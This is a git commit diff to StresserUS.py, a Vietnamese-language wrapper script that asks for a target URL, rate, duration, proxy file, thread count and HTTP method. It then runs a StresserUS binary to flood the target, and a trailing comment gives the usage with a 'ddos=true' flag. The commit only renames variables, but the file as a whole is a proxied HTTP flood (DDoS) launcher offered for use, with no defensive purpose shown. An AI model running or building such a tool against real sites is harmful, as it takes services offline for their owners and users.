72b7ebc0fd1319ed29b9f89973f1255d413e232c
Đậu Đậu <59077968+DauDau432@users.noreply.github.com>
2022-11-08 18:00:20 +0700

    Update StresserUS.py

--- StresserUS.py
+++ StresserUS.py
@@ -10,13 +10,13 @@ a='''
 	'''
 print(a)
 URL=input("  [+] Nhập URL Taget: ")
-LIMIT=int(input("  [+] Nhập số limit (64): "))
+LIMIT=int(input("  [+] Nhập số rate (64): "))
 TIME=int(input("  [+] Nhập Time (s): "))
-LIST=input("  [+] Nhập file proxy (http.txt): ")
-THREADS=(input("  [+] Nhập số luồng: "))
+proxyfile=input("  [+] Nhập file proxy (proxy.txt): ")
+THREADS=int(input("  [+] Nhập số luồng: "))
 METHOD=input("  [+] Nhập method (GET, POST, HEAD): ")
 print("=========================================")
 print("  Đã gửi yêu cầu\n")
-os.system(f"./StresserUS version=2 host={URL} limit={LIMIT} time={TIME} list={LIST} threads={THREADS} mode={METHOD}")
+os.system(f"./StresserUS version=2 host={URL} limit={LIMIT} time={TIME} list={proxyfile} threads={THREADS} mode={METHOD}")
 input()
 #./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>
